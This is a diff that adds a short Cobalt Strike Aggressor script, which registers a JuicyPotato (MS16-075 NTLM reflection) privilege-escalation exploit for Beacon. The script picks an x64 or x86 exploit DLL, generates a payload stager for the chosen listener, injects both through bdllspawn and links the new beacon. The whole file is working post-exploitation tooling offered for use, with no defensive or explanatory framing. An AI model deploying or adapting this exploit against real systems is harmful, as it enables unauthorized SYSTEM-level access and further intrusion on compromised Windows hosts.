@@ -1,0 +1,24 @@
+# module path settting
+$module_path = 'modules/';
+
+sub juicypotato {
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via JuicyPotato (ms16-075)");
+    
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $dll = script_resource("$module_path"."JuicyPotato.x64.dll");
+    } else {
+        $arch = "x86";
+        $dll = script_resource("$module_path"."JuicyPotato.x32.dll");
+    }
+
+    $stager = payload($2, $arch);
+
+    bdllspawn!($1, $dll, $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+    
+    beacon_link($1, $null, $2);
+}
+
+beacon_exploit_register("juicypotato", "JuicyPotato (ms16-075)", &juicypotato);
+
